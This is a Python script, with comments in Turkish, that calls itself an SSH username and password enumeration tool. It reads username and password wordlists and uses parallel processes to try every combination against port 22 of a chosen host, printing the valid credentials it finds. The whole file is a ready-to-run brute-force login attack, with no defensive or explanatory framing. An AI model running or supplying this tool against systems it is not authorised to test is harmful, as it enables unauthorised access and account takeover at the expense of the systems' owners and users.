#!/usr/bin/env python3

import argparse
import multiprocessing
import socket
from ssh2.session import Session

# Varsayılan kullanıcı listesi dosya yolu
DEFAULT_USER_LIST_PATH = 'modules/wordlists/usernames.txt'

# Argümanlar
arg_parser = argparse.ArgumentParser(description="SSH Username and Password Enumeration Tool")
arg_parser.add_argument('-t', dest='hostname', type=str, required=True, help='Target hostname or IP (Required)')
arg_parser.add_argument('-p', dest='password', type=str, help='Single password to test')
arg_parser.add_argument('-PS', dest='password_list', type=str, help='Password list file for multiple passwords')
arg_parser.add_argument('-u', dest='username', type=str, help='Single username to test')
arg_parser.add_argument('-U', dest='user_list', type=str, help='User list file for multiple usernames (Optional)')
arg_parser.add_argument('-T', dest='timeout', type=int, default=5, help='Socket timeout in seconds (Default: 5)')
arg_parser.add_argument('-P', dest='processes', type=int, default=5, help='Number of processes for multiprocessing (Default: 5)')
args = arg_parser.parse_args()

target = args.hostname
timeout = args.timeout
processes = args.processes

def ssh_auth_test(username, password):
    """Tests SSH authentication for a given username and password."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((target, 22))
        except socket.error:
            print(f"[-] {username}:{password} - Connection failed")
            return

        session = Session()
        session.handshake(sock)

        try:
            session.userauth_password(username, password)
            print(f"[+] Valid credentials found: {username}:{password}")
        except Exception as e:
            if "Authentication failed" in str(e):
                print(f"[-] {username}:{password} - Invalid credentials")
            else:
                print(f"[!] {username}:{password} - Unknown response: {e}")

        sock.close()
    except Exception as e:
        print(f"[!] Error testing {username}:{password} - {e}")


def load_usernames():
    """Loads usernames from a provided or default file, skipping comments."""
    user_file = args.user_list if args.user_list else DEFAULT_USER_LIST_PATH
    try:
        with open(user_file, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    except FileNotFoundError:
        print(f"[-] User list file not found: {user_file}")
        exit()


def load_passwords():
    """Loads passwords from a provided or default list, skipping comments."""
    passwords = []
    if args.password:
        passwords.append(args.password)
    if args.password_list:
        try:
            with open(args.password_list, 'r') as f:
                passwords.extend([line.strip() for line in f if line.strip() and not line.strip().startswith('#')])
        except FileNotFoundError:
            print(f"[-] Password list file not found: {args.password_list}")
            exit()
    return passwords


if __name__ == "__main__":
    # Kullanıcı ve parola listelerini yükle
    usernames = load_usernames()
    passwords = load_passwords()

    # Kullanıcı ve parola kombinasyonlarını test et
    if usernames and passwords:
        print("[*] Starting SSH authentication tests...")
        pool = multiprocessing.Pool(processes)
        pool.starmap(ssh_auth_test, [(u, p) for u in usernames for p in passwords])
        pool.close()
        pool.join()
    else:
        print("[-] No usernames or passwords provided for testing.")
